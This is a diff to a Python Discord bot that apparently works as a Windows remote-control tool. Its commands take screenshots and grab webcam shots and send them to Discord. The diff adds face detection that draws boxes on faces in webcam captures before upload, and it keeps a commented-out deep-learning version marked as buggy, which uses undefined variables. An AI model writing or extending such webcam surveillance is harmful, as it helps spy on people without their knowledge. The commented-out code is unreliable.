@@ -8,7 +8,6 @@ import win32api
 import ctypes
 import time
 
-
 from typing import *
 from win32con import *
 from ctypes import wintypes
@@ -802,6 +801,53 @@ class Helper:
     cv2.imwrite(pic_name, image)
     return pic_name
 
+  # AI / DEEP LEARNING VERSION (BUG ASK CHATGPT)
+  #def detectAndDrawFaces(photo_file, output_file):
+  #  img = cv2.imread(photo_file)
+  #  face_net = cv2.dnn.readNetFromCaffe("deploy.prototxt", "res10_300x300_ssd_iter_140000.caffemodel")
+
+    # Resize the input image to match the model's expected size (300x300)
+  #  blob = cv2.dnn.blobFromImage(cv2.resize(img, (300, 300)), 1.0, (300, 300), (104.0, 177.0, 123.0))
+
+    # Set the input to the model
+  #  face_net.setInput(blob)
+
+    # Forward pass to obtain detections
+  #  detections = face_net.forward()
+
+  #  for i in range(0, detections.shape[2]):
+  #    confidence = detections[0, 0, i, 2]
+
+  #    if confidence > 0.5:
+  #      box = detections[0, 0, i, 3:7] * np.array([w, h, w, h])
+  #      (startX, startY, endX, endY) = box.astype("int")
+  #      cv2.rectangle(img, (startX, startY), (endX, endY), (255, 0, 0), 2)
+
+    # Save the image with frames around faces
+  #  cv2.imwrite(output_file, img)
+  
+  def detectAndDrawFaces(photo_file):
+    img = cv2.imread(photo_file)
+    face_cascade = cv2.CascadeClassifier('cascades/haarcascade_frontalface_default.xml')
+    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
+
+    faces = face_cascade.detectMultiScale(
+      gray,
+      scaleFactor=1.3,
+      minNeighbors=5,
+      minSize=(10, 10)
+    )
+
+    # Draw rectangles around the faces on the original image
+    for (x, y, w, h) in faces:
+      cv2.rectangle(img, (x, y), (x + w, y + h), (255, 0, 0), 2)
+
+    os.remove(photo_file)
+    if not os.path.exists(photo_file):
+      cv2.imwrite(photo_file, img)
+    else:
+      return f'ERROR: The input file: "{photo_file}" was unable to be replaced.'
+
   def getDisplayCount():
     with mss.mss() as sct:
       monitor_count = len(sct.monitors)
@@ -860,7 +906,7 @@ async def on_ready():
   os.system('cls')
   for guild in bot.guilds:
     print(f'* {guild.name} (ID: {guild.id})')
-  print('Status: READY...\n')
+  print('STATUS: READY...\n')
 
   helpMsg = '''
 |----------------|---------------------------------------------|-------|
@@ -1032,6 +1078,7 @@ async def screenshot(ctx):
 @bot.command(name='webcam', description='Grab a shot from the webcam')
 async def grabWebcam(ctx):
   pic_name = Helper.takeWebcamShot()
+  Helper.detectAndDrawFaces(pic_name)
   await ctx.reply('Webcam', file=discord.File(pic_name))
 
 
